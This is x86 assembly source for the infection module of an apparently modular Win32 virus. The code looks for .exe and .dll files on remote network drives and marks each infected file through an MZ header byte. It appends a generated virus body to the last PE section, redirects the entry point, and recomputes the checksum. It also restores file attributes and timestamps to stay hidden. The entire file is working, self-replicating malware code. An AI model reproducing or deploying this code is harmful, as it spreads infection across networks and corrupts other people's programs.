
include                 INFECTA.INC
include                 ..\FILEIO\FILEIO.INC
include                 ..\MEMORY\MEMORY.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\PGN2\pgn2.inc
include                 ..\..\INCLUDE\mz.inc
include                 ..\..\INCLUDE\pe.inc
include                 ..\PLAN\PLAN.INC
include                 ..\LDRWIN32\LDRWIN32.INC
include                 ..\MAKEBODY\MAKEBODY.INC
include                 ..\EXTMAN\EXTMAN.INC

                        extrn   Event:PROC
                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

mz                      mz_struc ?
pe                      pe_struc ?
oe                      oe_struc ?

mbi                     makebody_info ?

last_oe_offs            dd      ?
vir_physoffs            dd      ?
vir_physsize            dd      ?
vir_virtsize            dd      ?
old_attr                dd      ?
openmode_changed        db      ?
oldcsum                 dd      ?

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id
                        mov     edx, [esp+8]    ; user_param = fname

                        cmp     eax, EV_EXTMAN_GOT_FILENAME
                        je      __check_file
                        cmp     eax, EV_INFECTA_INFECTFILE
                        je      __infect_edx

__return_0:             xor     eax, eax
                        retn

__check_file:           cmp     [edx].ei_is_alredy, 0
                        jne     __return_0

                        mov     eax, [edx].ei_ext
                        or      eax, 202020h

                        cmp     eax, 'exe'
                        je      __cont
                        cmp     eax, 'lld'
                        je      __cont

                        jmp     __return_0

__cont:
                        ; fullpath?
                        mov     edx, [edx].ei_fnameptr
                        cmp     byte ptr [edx+2], '\'
                        jne     __return_0

                        pusha
                        mov     eax, [edx]
                        and     eax, 00FFFFFFh
                        push    eax
                        push    esp
                        callW   GetDriveTypeA
                        cmp     eax, DRIVE_REMOTE
                        pop     eax
                        popa
                        jne     __return_0

__infect_edx:           call    infect
                        retn

; input:  EDX=filename
; output: EAX=0 -- NOT infected
;         EAX=1 -- INFECTED, alredy or right now
;
infect:                 pusha
                        cld

                        mov     openmode_changed, 0
                        mov     old_attr, -1

                        ; open file in read-only mode
                        push    edx             ; fname
                        callW   fopen_ro
                        or      eax, eax
                        jz      __return_0
                        xchg    ebx, eax

                        ; read MZ-header
                        push    0               ; pos
                        push    size mz
                        push    offset mz
                        push    ebx
                        callW   fread
                        cmp     eax, size mz
                        jne     __fclose_return_0

                        ; check MZ-header
                        mov     ax, mz.mz_id
                        neg     ax
                        cmp     ax, -'ZM'
                        jne     __fclose_return_0
                        cmp     mz.mz_relptr, 40h
                        jb      __fclose_return_0

                        ; check if alredy infected
                        cmp     mz.mz_csum.byte ptr 0, 1  ; alredy?
                        je      __fclose_return_1
                        mov     mz.mz_csum.byte ptr 0, 1  ; set infected sign

                        ; read PE-header
                        push    mz.mz_neptr     ; pos
                        push    size pe
                        push    offset pe
                        push    ebx
                        callW   fread
                        cmp     eax, size pe
                        jne     __fclose_return_0

                        ; check PE-header
                        mov     eax, pe.pe_id
                        neg     eax
                        cmp     eax, -'EP'
                        jne     __fclose_return_0
                        cmp     pe.pe_cputype, 14Ch     ; i386
                        jne     __fclose_return_0
;                       cmp     pe.pe_entrypointrva, 0  ; must be present
;                       je      __fclose_return_0
                        cmp     pe.pe_ntheadersize, 0E0h
                        jne     __fclose_return_0
                        cmp     pe.pe_filealign, 4096
                        ja      __fclose_return_0
                        cmp     pe.pe_objectalign, 4096
                        ja      __fclose_return_0

                        ; calc last object table entry offset
                        movzx   eax, pe.pe_numofobjects
                        dec     eax
                        imul    eax, size oe_struc
                        movzx   ecx, pe.pe_ntheadersize
                        lea     eax, [eax+ecx+18h]
                        add     eax, mz.mz_neptr
                        mov     last_oe_offs, eax

                        ; read last object table entry
                        push    eax             ; pos
                        push    size oe
                        push    offset oe
                        push    ebx
                        callW   fread
                        cmp     eax, size oe
                        jne     __fclose_return_0

                        ; align last object entry's phys size
                        mov     eax, pe.pe_filealign
                        dec     eax
                        add     oe.oe_physsize, eax
                        not     eax
                        and     oe.oe_physsize, eax

                        ; align last object entry's virt size
                        mov     eax, pe.pe_objectalign
                        dec     eax
                        add     oe.oe_virtsize, eax
                        not     eax
                        and     oe.oe_virtsize, eax

                        ; perform additional check:
                        ; virtual size shouldn't be less than physical
                        mov     ecx, oe.oe_virtsize
                        jecxz   __skip0
                        cmp     ecx, oe.oe_physsize
                        jb      __fclose_return_0
__skip0:
                        ; calc virus physical offset, strip overlay
                        mov     eax, oe.oe_physoffs
                        add     eax, oe.oe_physsize
                        mov     vir_physoffs, eax

                        ; calc virus virtual address
                        mov     eax, oe.oe_virtrva
                        add     eax, oe.oe_physsize
                        mov     mbi.mbi_vir_virtrva, eax

                        ; make fwrite possible
                        mov     eax, cs
                        cmp     eax, 28h
                        jne     __ring3
__ring0:
                        ; ring-0: change file open mode to read-write
                        mov     eax, [ebx+0Ch]
                        cmp     byte ptr [eax+0Ch], 44h ; denynone, r/o
                        jne     __ring3
                        mov     byte ptr [eax+0Ch], 42h ; denynone, r/w
                        mov     openmode_changed, 1

                        jmp     __cont1
__ring3:
                        ; ring3: reopen file in read-write mode
                        push    ebx
                        callW   fclose

                        push    [esp].pusha_edx ; fname
                        callW   fgetattr
                        mov     old_attr, eax

                        push    32              ; archive
                        push    [esp+4].pusha_edx ; fname
                        callW   fsetattr
                        or      eax, eax
                        jz      __return_0

                        push    [esp].pusha_edx ; fname
                        callW   fopen_rw        ; open in read-write mode
                        or      eax, eax
                        jz      __return_0
                        xchg    ebx, eax
__cont1:
                        ; save entry
                        mov     mbi.mbi_flags, 0

                        mov     eax, pe.pe_entrypointrva
                        mov     mbi.mbi_vir_origentry, eax

                        or      eax, eax
                        jnz     __cont2
                        or      mbi.mbi_flags, FL_MBI_RET0C
__cont2:

                        ; build virus body
                        push    offset mbi
                        callW   build_body
                        add     esp, 4

                        or      eax, eax
                        jz      __fclose_return_0

                        ; calc virus physical size
                        mov     eax, mbi.mbi_vir_size
                        mov     ecx, pe.pe_filealign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     vir_physsize, eax

                        ; calc virus virtual size
                        mov     eax, mbi.mbi_vir_size
                        mov     ecx, pe.pe_objectalign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     vir_virtsize, eax

                        ; recalculate last object table entry phys size
                        mov     eax, vir_physsize
                        add     oe.oe_physsize, eax

                        ; recalculate last object table entry virt size
                        mov     ecx, oe.oe_virtsize
                        jecxz   __skip1
                        add     ecx, vir_virtsize
                        mov     oe.oe_virtsize, ecx
__skip1:
                        ; recalculate some PE header entries
                        mov     eax, vir_virtsize
                        add     pe.pe_imagesize, eax

                        mov     eax, mbi.mbi_vir_virtrva
                        add     eax, mbi.mbi_vir_currentry
                        mov     pe.pe_entrypointrva, eax

                        xor     eax, eax
                        xchg    eax, pe.pe_checksum
                        mov     oldcsum, eax

                        push    ebx
                        callW   fgettimev

                        ; write MZ-header
                        push    0
                        push    size mz
                        push    offset mz
                        push    ebx
                        callW   fwrite
                        cmp     eax, size mz
                        jne     __err_write

                        ; write PE-header
                        push    mz.mz_neptr
                        push    size pe
                        push    offset pe
                        push    ebx
                        callW   fwrite
                        cmp     eax, size pe
                        jne     __err_write

                        ; write last object table entry
                        push    last_oe_offs
                        push    size oe
                        push    offset oe
                        push    ebx
                        callW   fwrite
                        cmp     eax, size oe
                        jne     __err_write

                        ; write viral body
                        push    vir_physoffs
                        push    vir_physsize
                        push    mbi.mbi_vir_ptr
                        push    ebx
                        callW   fwrite
                        cmp     eax, vir_physsize
                        jne     __err_write

                        callW   build_free

                        cmp     oldcsum, 0
                        je      __skipcsum

                        push    ebx
                        callW   fgetsize
                        xchg    esi, eax

                        push    esi
                        callW   malloc
                        xchg    edi, eax

                        push    0       ; pos
                        push    esi
                        push    edi
                        push    ebx
                        callW   fread

                        xor     eax, eax
                        xor     ecx, ecx
__calc:                 add     ax, [edi+ecx]
                        adc     ax, 0
                        inc     ecx
                        inc     ecx
                        cmp     ecx, esi
                        jb      __calc
                        add     eax, esi

                        mov     edx, [edi].mz_neptr
                        mov     [edi+edx].pe_checksum, eax

                        push    0       ; pos
                        push    esi
                        push    edi
                        push    ebx
                        callW   fwrite

                        push    edi
                        callW   mfree
__skipcsum:
                        ;;

__fclose_return_1:      call    __closefile

__return_1:             mov     [esp].popa_eax, 1
                        jmp     __return

__err_write:            callW   build_free

__fclose_return_0:      call    __closefile

__return_0:             mov     [esp].popa_eax, 0

__return:               popa
                        retn

__closefile:            dec     openmode_changed
                        jnz     __skip2
                        ; restore file open mode
                        mov     eax, [ebx+0Ch]
                        mov     byte ptr [eax+0Ch], 44h ; denynone, r/o

__skip2:
                        push    ebx
                        callW   fsettimev

                        push    ebx
                        callW   fclose

                        ; restore file attribute, if changed
                        cmp     old_attr, -1
                        je      __skip_rest_attr

                        push    old_attr
                        push    [esp+4+4].pusha_edx ; fname
                        callW   fsetattr
__skip_rest_attr:

                        retn

                        end
